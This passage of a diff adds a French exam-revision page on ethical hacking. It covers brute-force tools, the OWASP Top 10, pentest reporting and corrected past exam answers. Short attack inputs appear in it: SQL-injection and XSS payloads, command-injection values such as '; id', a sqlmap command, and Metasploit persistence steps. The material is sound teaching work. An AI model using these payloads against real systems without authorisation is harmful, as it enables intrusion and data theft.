+          <li><strong>MFA</strong> et authentification forte.</li>
+          <li><strong>Segmentation</strong> pour limiter le mouvement latéral.</li>
+        </ul>
+        <div class="box tip"><div class="box-title">Réponse structurée</div><p>Préventif : moindre privilège, patch, durcissement, segmentation, MFA. Détectif : logs, SIEM, EDR, alertes sur 4625/4672, analyse mémoire. Correctif : isolation, rotation des credentials, restauration, revue post-incident.</p></div>
+      </section>
+
+      <section class="note" id="brute" data-topic="eh-9">
+        <div class="note-head"><div class="note-num">9</div><h2>Brute force &amp; mots de passe</h2><label class="topic-check"><input type="checkbox" data-topic="eh-9">Validé</label></div>
+        <div class="grid-2">
+          <div class="box"><div class="box-title">Brute force</div><p>Teste <strong>toutes les combinaisons possibles</strong> d'un espace de caractères. Efficace sur les mots de passe courts, inefficace sur les longs et complexes. Très bruyant.</p></div>
+          <div class="box"><div class="box-title">Dictionnaire</div><p>Teste une <strong>liste de mots préexistante</strong> (rockyou.txt, mots courants, variantes). Plus rapide et plus efficace si le mot de passe est un mot du dictionnaire ou une variante simple.</p></div>
+        </div>
+        <p><strong>Contexte d'usage :</strong> formulaires de login, SSH, RDP, FTP, HTTP Basic, hashs volés, Wi-Fi (handshake). Le brute force en ligne est limité par le réseau et les protections ; le cracking hors ligne est limité par la puissance GPU et la robustesse du hash.</p>
+        <h3>Outils</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Outil</th><th>Usage</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Hydra</strong></td><td>Brute force multi-protocoles (SSH, FTP, HTTP, RDP…). <code>-l</code> utilisateur, <code>-L</code> liste, <code>-p</code> mot de passe, <code>-P</code> liste.</td></tr>
+              <tr><td><strong>Medusa</strong></td><td>Brute force parallèle, rapide.</td></tr>
+              <tr><td><strong>Patator</strong></td><td>Brute force modulaire, flexible.</td></tr>
+              <tr><td><strong>John the Ripper</strong></td><td>Cracking de hashs, règles de mutation.</td></tr>
+              <tr><td><strong>Hashcat</strong></td><td>Cracking GPU. Modes : <code>-m 0</code> MD5, <code>-m 1000</code> NTLM, <code>-m 1800</code> sha512crypt.</td></tr>
+              <tr><td><strong>Crunch</strong></td><td>Génération de wordlists personnalisées.</td></tr>
+              <tr><td><strong>CeWL</strong></td><td>Wordlist à partir du vocabulaire d'un site.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Pourquoi ça échoue sur un système bien protégé</h3>
+        <ul>
+          <li><strong>Hash lent et salé</strong> : bcrypt, Argon2, PBKDF2 avec sel et itérations. Le sel empêche les tables précalculées ; les itérations ralentissent chaque essai.</li>
+          <li><strong>Politique de mot de passe</strong> : longueur, complexité, pas de réutilisation.</li>
+          <li><strong>Verrouillage de compte</strong> et <strong>rate limiting</strong>.</li>
+          <li><strong>MFA</strong> : même un mot de passe correct ne suffit pas.</li>
+          <li><strong>Fail2ban</strong> : bloque l'IP après N échecs.</li>
+          <li><strong>CAPTCHA</strong>, geo-blocking, détection comportementale.</li>
+        </ul>
+        <div class="box key"><div class="box-title">Fail2ban (QCM 2024)</div><p>Surveille les logs et <strong>bloque automatiquement les adresses IP</strong> après un certain nombre de tentatives échouées. Il ne chiffre pas les mots de passe et ne supprime pas les utilisateurs.</p></div>
+
+        <h3>Détection &amp; réponse automatisée</h3>
+        <p>Surveiller les événements <strong>4625</strong> (échec de connexion Windows), les pics d'authentification, les IP récurrentes, les user-agents anormaux. Déclencher : blocage temporaire, quarantaine, alerte SOC, augmentation du niveau de log, honeypot. Sous Linux : <code>fail2ban</code>, <code>sshguard</code>, <code>pam_tally2</code>/<code>faillock</code>.</p>
+        <div class="box warn"><div class="box-title">Conséquences d'un brute force réussi</div><p>Accès au compte, vol de données, élévation de privilèges, déploiement de malware, mouvement latéral, déni de service par saturation, atteinte à la réputation et obligations RGPD en cas de fuite.</p></div>
+      </section>
+
+      <section class="note" id="web" data-topic="eh-10">
+        <div class="note-head"><div class="note-num">10</div><h2>Pentest web &amp; OWASP</h2><label class="topic-check"><input type="checkbox" data-topic="eh-10">Validé</label></div>
+        <p>Les applications web sont exposées publiquement : elles sont la cible privilégiée. Le pentest web suit une méthodologie (OWASP WSTG) et couvre l'authentification, les sessions, les entrées, la logique métier et les API.</p>
+        <h3>OWASP Top 10 — 2021</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Risque</th><th>Ce que c'est</th><th>Exemple / défense</th></tr></thead>
+            <tbody>
+              <tr><td>A01 Broken Access Control</td><td>Contrôle d'accès défaillant : IDOR, accès admin sans rôle.</td><td>Vérifier les droits côté serveur, deny by default.</td></tr>
+              <tr><td>A02 Cryptographic Failures</td><td>Chiffrement absent ou faible, données sensibles en clair.</td><td>TLS, hash fort, ne pas stocker de secrets en clair.</td></tr>
+              <tr><td>A03 Injection</td><td>SQL, NoSQL, commande, LDAP, XSS.</td><td>Requêtes préparées, validation, encodage.</td></tr>
+              <tr><td>A04 Insecure Design</td><td>Défaut de conception, pas seulement de code.</td><td>Threat modeling, principes security by design.</td></tr>
+              <tr><td>A05 Security Misconfiguration</td><td>Services par défaut, comptes par défaut, en-têtes absents.</td><td>Durcissement, CIS, suppression des services inutiles.</td></tr>
+              <tr><td>A06 Vulnerable Components</td><td>Bibliothèques obsolètes, CVE connues.</td><td>SCA, patch management, inventaire.</td></tr>
+              <tr><td>A07 Auth Failures</td><td>Brute force, sessions faibles, pas de MFA.</td><td>MFA, rate limiting, cookies sécurisés.</td></tr>
+              <tr><td>A08 Integrity Failures</td><td>Dépendances non signées, CI/CD compromis.</td><td>Signatures, SRI, pipeline sécurisé.</td></tr>
+              <tr><td>A09 Logging Failures</td><td>Pas de logs, pas d'alertes, pas de réponse.</td><td>SIEM, logs centralisés, plans d'incident.</td></tr>
+              <tr><td>A10 SSRF</td><td>Le serveur est forcé d'appeler une URL interne.</td><td>Allowlist, blocage des IP internes/metadata.</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <h3>Les vulnérabilités à savoir exploiter</h3>
+        <div class="grid-2">
+          <div class="box"><div class="box-title">SQL Injection</div><p>Payload de contournement : <code>' OR 1=1 -- -</code>. Union : <code>' UNION SELECT ...</code>. Outil : <code>sqlmap -u "http://cible/page.php?id=1" --dbs</code>. Défense : requêtes préparées, validation, moindre privilège DB, WAF.</p></div>
+          <div class="box"><div class="box-title">XSS</div><p>Reflected, stored, DOM. Payload : <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Défense : encodage de sortie, CSP, HttpOnly, validation.</p></div>
+          <div class="box"><div class="box-title">IDOR</div><p>Changer un identifiant dans l'URL : <code>/patient.php?id=2</code>. Défense : contrôle d'accès côté serveur, IDs non devinables, logs.</p></div>
+          <div class="box"><div class="box-title">CSRF</div><p>Forcer le navigateur à envoyer une requête authentifiée. Défense : token anti-CSRF, SameSite, vérification Origin/Referer.</p></div>
+          <div class="box"><div class="box-title">LFI/RFI</div><p>Inclusion de fichiers locaux/distants via un paramètre. Défense : allowlist, pas de chemins utilisateur, open_basedir.</p></div>
+          <div class="box"><div class="box-title">Command injection</div><p>Injecter <code>; id</code> ou <code>| whoami</code> dans un champ exécuté par le système. Défense : éviter <code>system()</code>, valider, utiliser des API.</p></div>
+        </div>
+        <h3>Outils</h3>
+        <p><strong>Burp Suite</strong> (interception, repeater, intruder), <strong>OWASP ZAP</strong>, <strong>Nikto</strong>, <strong>Gobuster/dirb</strong>, <strong>sqlmap</strong>, <strong>WPScan</strong>, <strong>Nuclei</strong>. Toujours vérifier manuellement : un scanner ne comprend pas la logique métier.</p>
+        <div class="box key"><div class="box-title">CVSS v3.1</div><p>Score de 0 à 10 : <em>None</em> 0, <em>Low</em> 0.1–3.9, <em>Medium</em> 4–6.9, <em>High</em> 7–8.9, <em>Critical</em> 9–10. Métriques de base : vecteur d'attaque, complexité, privilèges requis, interaction utilisateur, portée, confidentialité, intégrité, disponibilité. Les métriques temporelles et environnementales ajustent le score.</p></div>
+      </section>
+
+      <section class="note" id="report" data-topic="eh-11">
+        <div class="note-head"><div class="note-num">11</div><h2>Rapport &amp; méthodologies</h2><label class="topic-check"><input type="checkbox" data-topic="eh-11">Validé</label></div>
+        <h3>Le rapport de pentest</h3>
+        <ol>
+          <li><strong>Synthèse exécutive</strong> : périmètre, dates, niveau de risque global, 3 à 5 messages clés, recommandation.</li>
+          <li><strong>Méthodologie</strong> : référentiel, type de test (black/grey/white), outils, limites, autorisations.</li>
+          <li><strong>Constats</strong> : pour chaque vulnérabilité — description, preuve (capture, requête), CVSS, impact métier, recommandation, référence CVE/OWASP.</li>
+          <li><strong>Plan de remédiation</strong> : priorisé (critique → faible), effort, responsable, délai.</li>
+          <li><strong>Annexes</strong> : périmètre détaillé, logs, commandes, matrices de risque.</li>
+        </ol>
+        <p>Le rapport doit être compréhensible par un décideur <em>et</em> exploitable par un technicien. Il ne doit pas contenir de données sensibles inutiles.</p>
+
+        <h3>Les méthodologies</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Référentiel</th><th>Focus</th><th>À citer pour…</th></tr></thead>
+            <tbody>
+              <tr><td><strong>PTES</strong></td><td>Pentest complet, 7 phases.</td><td>Déroulé général d'une mission.</td></tr>
+              <tr><td><strong>OWASP WSTG</strong></td><td>Applications web, mobiles, API ; 12 catégories de tests.</td><td>Pentest web.</td></tr>
+              <tr><td><strong>NIST SP 800-115</strong></td><td>Planning, discovery, attack, reporting.</td><td>Cadre formel, secteurs réglementés.</td></tr>
+              <tr><td><strong>OSSTMM</strong></td><td>Approche scientifique, physique/humain/technique.</td><td>Audit global.</td></tr>
+              <tr><td><strong>PCI-DSS 11.4</strong></td><td>Test annuel obligatoire pour les environnements de paiement.</td><td>Conformité carte bancaire.</td></tr>
+              <tr><td><strong>MITRE ATT&amp;CK</strong></td><td>Base de techniques adverses (TTP).</td><td>Cartographier les comportements d'attaque.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Le projet de classe — template de réponse</h3>
+        <p>La question 2025 demande de décrire les 5 étapes <strong>en s'appuyant sur ton projet</strong>. Prépare un exemple générique, adaptable :</p>
+        <div class="box key">
+          <div class="box-title">Exemple de scénario à réutiliser</div>
+          <p><strong>1. Reconnaissance :</strong> WHOIS, theHarvester, Shodan, Maltego pour cartographier le domaine, les emails et les services exposés. <strong>2. Scan :</strong> Nmap <code>-sV -O</code>, Gobuster, Nikto pour les ports, versions et répertoires. <strong>3. Accès :</strong> exploitation d'une vulnérabilité web (SQLi) ou SMB (EternalBlue) avec Metasploit/Burp. <strong>4. Persistance :</strong> Meterpreter, création d'un compte de service ou tâche planifiée. <strong>5. Nettoyage &amp; rapport :</strong> suppression des artefacts de test, preuves, CVSS, remédiation.</p>
+        </div>
+        <div class="box tip"><div class="box-title">Astuce</div><p>Si tu n'as pas de projet précis en tête, utilise un scénario de lab (Metasploitable, DVWA, VulnClinic). Le correcteur évalue la méthode et les outils, pas la véracité de ton projet.</p></div>
+      </section>
+
+      <section class="note" id="annales" data-topic="eh-12">
+        <div class="note-head"><div class="note-num">12</div><h2>Annales : questions ouvertes corrigées</h2><label class="topic-check"><input type="checkbox" data-topic="eh-12">Validé</label></div>
+        <p>Les 5 questions ouvertes de 2025, avec une réponse structurée. Entraîne-toi à les rédiger en 8 à 10 minutes chacune.</p>
+
+        <details class="q-open">
+          <summary>2025 · Q1 — Stratégie OSINT avec Maltego, Shodan et DNSdumpster</summary>
+          <div class="details-body">
+            <p><strong>1. Collecte :</strong> partir du domaine et des URLs. DNSdumpster pour cartographier les sous-domaines, MX, TXT et hôtes ; Shodan pour les services exposés et les bannières ; Maltego pour relier domaines, IP, emails, personnes et organisations. Compléter avec WHOIS, crt.sh, theHarvester.</p>
+            <p><strong>2. Nettoyage :</strong> dédoublonner, normaliser (domaines, IP), dater, croiser au moins deux sources, écarter les faux positifs, classer par niveau de confiance et par pertinence pour le périmètre.</p>
+            <p><strong>3. Influence sur l'exploitation :</strong> les services exposés orientent le choix des vecteurs (VPN, webmail, RDP), les versions logicielles orientent les CVE, les emails alimentent le phishing ciblé, la topologie guide le pivoting. On priorise les cibles à fort impact et on adapte les payloads à l'environnement découvert.</p>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2025 · Q2 — Scénario Metasploit : accès, élévation, persistance</summary>
+          <div class="details-body">
+            <p><strong>Accès initial :</strong> scan Nmap, identification d'un service vulnérable (ex. SMB non patché, application web avec SQLi). <code>search</code>, <code>use</code>, <code>set RHOSTS/LHOST</code>, <code>run</code>. On obtient une session Meterpreter.</p>
+            <p><strong>Élévation :</strong> <code>getuid</code>, <code>sysinfo</code>, recherche de privilèges ; exploitation d'un service mal configuré, d'un token ou d'une tâche planifiée. Sous Windows : UAC bypass, vol de token, service non quoté. Sous Linux : sudo, SUID, cron.</p>
+            <p><strong>Persistance :</strong> module <code>persistence</code>, création d'un compte, clé SSH, tâche planifiée ou service. Vérifier la survie après redémarrage, rester discret, documenter pour le rapport. Ne pas laisser de backdoor non contrôlée : le pentest doit pouvoir la retirer.</p>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2025 · Q3 — Les 5 étapes du pentest appliquées à ton projet</summary>
+          <div class="details-body">
+            <p>Utilise le template de la section 11. Structure attendue : une phrase de contexte, puis pour chaque étape : <strong>objectif</strong>, <strong>outils</strong>, <strong>résultat</strong>. Exemple : « Lors de la reconnaissance passive, j'ai utilisé Shodan et theHarvester pour identifier 12 sous-domaines et 4 emails ; cela nous a permis de cibler le portail de staging lors du scan. »</p>
+            <div class="box warn"><div class="box-title">Ne pas oublier</div><p>La 5e étape est le <strong>nettoyage des traces</strong> (ou la suppression des artefacts) et la <strong>restitution</strong>. Beaucoup d'étudiants s'arrêtent à l'exploitation et perdent des points.</p></div>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2025 · Q4 — Brute force : définition, contexte, conséquences, défense</summary>
+          <div class="details-body">
+            <p><strong>Définition :</strong> essai systématique de combinaisons (brute force) ou d'une liste de mots (dictionnaire) pour deviner un secret d'authentification.</p>
+            <p><strong>Contextes :</strong> formulaires de login, SSH/RDP/FTP, hashs volés, Wi-Fi, API. En ligne, la vitesse est limitée par le réseau ; hors ligne, par la puissance de calcul et le hash.</p>
+            <p><strong>Conséquences :</strong> accès non autorisé, vol de données, élévation de privilèges, mouvement latéral, DoS par saturation, atteinte à la réputation, notification RGPD.</p>
+            <p><strong>Défense :</strong> MFA, mots de passe longs, hash bcrypt/Argon2 salé et itéré, verrouillage de compte, rate limiting, CAPTCHA, Fail2ban, détection des 4625, blocage géographique, honeypot. La réponse automatisée peut bannir l'IP, isoler le compte et alerter le SOC.</p>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2025 · Q5 — Legion et nbtscan</summary>
+          <div class="details-body">
+            <p><strong>Legion :</strong> framework graphique d'énumération automatisée. Il lance Nmap, puis des outils spécialisés selon les services (SMB, HTTP, etc.). Il produit une cartographie multi-protocoles et facilite la gestion de plusieurs cibles.</p>
+            <p><strong>nbtscan :</strong> outil CLI spécialisé NetBIOS. Il scanne une plage IP et retourne les noms NetBIOS, domaines/groupes de travail, adresses MAC, parfois les utilisateurs connectés. Rapide, sans authentification, idéal pour un premier balayage Windows.</p>
+            <p><strong>Complémentarité :</strong> nbtscan donne une vue rapide du réseau Windows ; Legion approfondit et corrèle. Dans une stratégie de cartographie : nbtscan en premier, puis Nmap/Legion pour les services, puis les outils spécialisés (enum4linux, Nikto).</p>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2024 · Footprinting : techniques, outils, influence sur l'exploitation</summary>
+          <div class="details-body">
+            <p><strong>Passif :</strong> OSINT (sites, réseaux sociaux, communiqués), WHOIS, DNS, Google Dorks, métadonnées, bases publiques. <strong>Actif (autorisé) :</strong> Nmap, énumération DNS, traceroute. <strong>Influence :</strong> identification des technologies, des sous-domaines, des emails, des services exposés ; choix des vecteurs, personnalisation du phishing, priorisation des cibles, adaptation des exploits.</p>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2024 · NSE : définition et exemple</summary>
+          <div class="details-body">
+            <p>Moteur de scripts Lua intégré à Nmap. Il automatise la détection de vulnérabilités, l'énumération et les tests de configuration. Exemple : <code>nmap --script vuln</code> sur un serveur web pour tester les CVE connues, ou <code>--script smb-enum-users</code> pour énumérer les comptes SMB. Les scripts sont classés par catégories (<code>safe</code>, <code>auth</code>, <code>vuln</code>…).</p>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2024 · Contre-mesures post-exploitation</summary>
+          <div class="details-body">
+            <p>Prévention : moindre privilège, patch management, désactivation des services, permissions, SELinux/AppArmor, chiffrement, MFA. Détection : logs centralisés, EDR, surveillance des élévations, intégrité des fichiers, analyse mémoire. Réponse : isolation, rotation des credentials, restauration, retour d'expérience.</p>
+          </div>
+        </details>
+
+        <details class="q-open">
+          <summary>2024 · Pentest web : importance et méthodologies</summary>
+          <div class="details-body">
+            <p>Les applications web sont exposées et manipulent des données sensibles : elles sont la première cible. Un pentest web identifie les vulnérabilités avant un attaquant, valide la conformité et priorise les corrections. Référentiels : OWASP WSTG (Top 10, 12 catégories), PTES, NIST SP 800-115, OSSTMM. Outils : Burp Suite, ZAP, Nikto, sqlmap. Livrable : rapport avec CVSS et plan de remédiation.</p>
+          </div>
+        </details>
+      </section>
+
+      <section class="note" id="quiz" data-topic="eh-quiz">
+        <div class="note-head"><div class="note-num">?</div><h2>Quiz express</h2><label class="topic-check" style="display:none"><input type="checkbox"></label></div>
+        <p class="muted small">10 questions tirées au hasard. Corrigé immédiat, score final. Objectif : 8/10 avant l'examen.</p>
+        <div class="quiz-shell" data-quiz="eh" data-count="10"></div>
+      </section>
+
+      <section class="note" id="flashcards" data-topic="eh-fc">
+        <div class="note-head"><div class="note-num">⚡</div><h2>Flashcards</h2></div>
+        <p>Récupération active : lis la question, réponds à voix haute, retourne la carte.</p>
+        <button class="btn primary" data-flashcards="eh">Lancer les flashcards →</button>
+        <span class="small muted" style="margin-left:8px">Espace = retourner · ← → = naviguer</span>
+      </section>
+
+      <div class="box exam">
+        <div class="box-title">Dernière minute — Ethical Hacking</div>
+        <ul class="two-col-list">
+          <li>5 phases : recon → scan → accès → persistance → traces.</li>
+          <li>Passif = pas d'interaction ; actif = Nmap, scan.</li>
+          <li>Nmap : <code>-sV</code> version, <code>-O</code> OS, <code>-sS</code> SYN.</li>
+          <li>Metasploit : <code>set RHOSTS</code>, <code>set LHOST</code>.</li>
+          <li>Meterpreter = shell en mémoire.</li>
+          <li>msfvenom : <code>-p</code>, <code>LHOST</code>, <code>LPORT</code>, <code>-f</code>, <code>-o</code>.</li>
+          <li>Reverse shell = cible → attaquant.</li>
+          <li>Brute force = toutes les combinaisons ; dictionnaire = liste.</li>
+          <li>Fail2ban = bloque les IP après échecs.</li>
+          <li>OWASP A01 = broken access control ; A03 = injection.</li>
+          <li>Rapport : synthèse, constats, CVSS, remédiation.</li>
+          <li>PTES = déroulé complet ; OWASP WSTG = web.</li>
+        </ul>
+      </div>
+
+      <div class="hero-actions no-print">
+        <a class="btn" href="reseau.html">Matière suivante : Réseaux →</a>
+        <a class="btn ghost" href="last-minute.html">Dernière minute</a>
+        <button class="btn ghost" data-action="print">Imprimer la fiche</button>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer class="footer"><div class="wrap"><span>Ethical Hacking · synthèse cours + TP + annales 2024/2025.</span><span><a href="index.html">Accueil</a> · <a href="plan.html">Plan</a></span></div></footer>
+
+<nav class="mobile-nav" aria-label="Navigation mobile">
+  <a href="index.html"><span>⌂</span>Accueil</a><a href="plan.html"><span>▦</span>Plan</a><a href="eh.html" class="active"><span>EH</span>Hacking</a><a href="reseau.html"><span>SR</span>Réseaux</a><a href="os.html"><span>OS</span>OS</a><a href="si.html"><span>SI</span>SI</a><a href="vs.html"><span>VS</span>Virtu.</a><a href="last-minute.html"><span>⚡</span>J-1</a>
+</nav>
+
+<div class="search-overlay" id="search-overlay"><div class="search-box"><div class="search-input-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg><input id="search-input" type="search" placeholder="Rechercher une notion, un outil, une commande…" autocomplete="off"><span class="kbd">Échap</span></div><div class="search-results" id="search-results"></div></div></div>
+
+<div class="fc-overlay" id="fc-overlay">
+  <div class="fc-modal">
+    <div class="fc-head"><strong>Flashcards · Ethical Hacking</strong><span class="fc-count" id="fc-count">1 / 1</span><button class="icon-btn" id="fc-close" aria-label="Fermer">✕</button></div>
+    <div class="fc-card" id="fc-card"><div class="fc-inner">
+      <div class="fc-face" id="fc-front"><div class="tag">Question</div><div class="fc-text"></div><div class="hint">Clique pour retourner</div></div>
+      <div class="fc-face fc-back" id="fc-back"><div class="tag">Réponse</div><div class="fc-text"></div><div class="hint">Clique pour revenir</div></div>
+    </div></div>
+    <div class="fc-controls"><button class="btn" id="fc-prev">← Précédent</button><button class="btn" id="fc-shuffle">Mélanger</button><button class="btn primary" id="fc-next">Suivant →</button></div>
+  </div>
+</div>
+
+<script src="assets/search-index.js"></script>
+<script src="assets/quiz-data.js"></script>
+<script src="assets/flashcards.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
